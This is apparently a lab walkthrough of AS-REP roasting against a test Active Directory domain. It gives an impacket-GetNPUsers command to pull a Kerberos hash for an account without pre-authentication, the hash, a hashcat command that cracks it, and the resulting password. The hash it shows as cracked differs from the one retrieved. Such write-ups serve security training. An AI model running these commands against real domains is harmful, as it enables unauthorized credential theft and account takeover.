# AS-REP Roasting Attack

This attack is for aacounts that have Kerberos pre-authentication disabled.
It users a users.txt list, which for lab purposes only contains the vulnerable user account.

---
&nbsp;


### 1. Getting the hash:

We will use impacket to get the hash and save it to a file for cracking it later.

&nbsp;

```bash
impacket-GetNPUsers corp.local/ -dc-ip 192.168.91.129 -usersfile users.txt -no-pass > as-rep-hash.txt
```

&nbsp;

We sucessfully retrieved the hash:

$krb5asrep$23$asrep.user@CORP.LOCAL:b69421478795368d0d4baaba64cd2c38$9f9877438e708bdac2b1efcd57a0a03757a6cbb283cc67ff1e412cff568ceb50fd0fa87bb9380a297ca5005365121874a53a8ee1c8f23b5464124faa527cc0533ffdea0def1f4b0ceaae5e711750a522d9933a4c871b18352feab6e94fe4228856187aea7268ce0dc27597d29daae3d69f1ab1081dda758e2af1bfc3c6da7c4d7cfbc33403988604f3f9dfefddb00d070794ec8a4ad6e52ed81ee5e8614ea416ab3a1243c730f9a7cb8c69fe8d12f5702334107b229ebf688ec0def444c535c2bcfa0501514bacd225b7f2db4f3c548d1ce8f928b425e6f736d3d9aabc53236b57e6b70e77155144

---
&nbsp;

&nbsp;

### 2. Cracking the hash

We will use hashcat to crack the password from the hash. The `-m` argument specifies the hash type, which in this case is 18200 for Kerberos 5 AS-REP hashes, which is the format retrieved from accounts with pre-authentication disabled.

&nbsp;

```bash
hashcat -m 18200 as-rep-hash.txt /usr/share/wordlists/rockyou.txt
```

&nbsp;

We successfully cracked the password:

$krb5asrep$23$asrep.user@CORP.LOCAL:0d05dfa801470432092eeafa53449576$11d6321f896c1813497b1bf958e6de8d8ebfc29f9e956b74596a128f39f2f9a7a203e680e063a2885cf7fa0d4bc82f8eb6900bcd947f92d69320da1cc10ce68986a8bb5a645e743951ffc32e8daa8f8e33cb2c6d839cfd4cf7c40a89f394c92f6b0a4cfaaa69805a320c7a50cb86ee88a97a157907bb1b7a0d8535a43e3948292e8b1f23c7be355695c8ba0d76b59af0577ec569499b9ecc8fedb0c2674fcfcbb7f241b1217a35ab0cc553f39d99239a65768b46bd659ccda3629e6bad8760003ab3c7335861c3dde8a7f86efad21a136a4e7fc9312d04d01d8d0b9dd720a89fc847f3d3f67ab25c:  **Password1**

---
&nbsp;
